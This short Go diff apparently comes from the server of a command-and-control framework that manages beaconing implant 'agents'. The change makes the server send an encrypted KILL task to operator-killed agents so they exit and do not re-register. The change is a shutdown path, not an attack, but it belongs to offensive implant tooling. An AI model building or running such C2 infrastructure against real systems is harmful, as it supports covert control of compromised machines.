@@ -201,8 +201,23 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	}
 
 	agent, err := s.db.GetAgent(agentID)
-	if err != nil || !agent.Active {
+	if err != nil {
 		http.Error(w, "unknown agent", http.StatusNotFound)
+		return
+	}
+	if !agent.Active {
+		// Agent was killed via the operator API. Reply with a synthetic KILL task
+		// so the process exits cleanly instead of re-registering (which would reset
+		// active=1 via INSERT OR REPLACE and bring the agent back to life).
+		killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
+		pt, _ := json.Marshal(beaconResponse{Tasks: killWires})
+		enc, encErr := Seal(agent.AESKey, pt)
+		if encErr != nil {
+			http.Error(w, "encrypt error", http.StatusInternalServerError)
+			return
+		}
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Write(enc) //nolint:errcheck
 		return
 	}
 	s.db.TouchAgent(agentID)
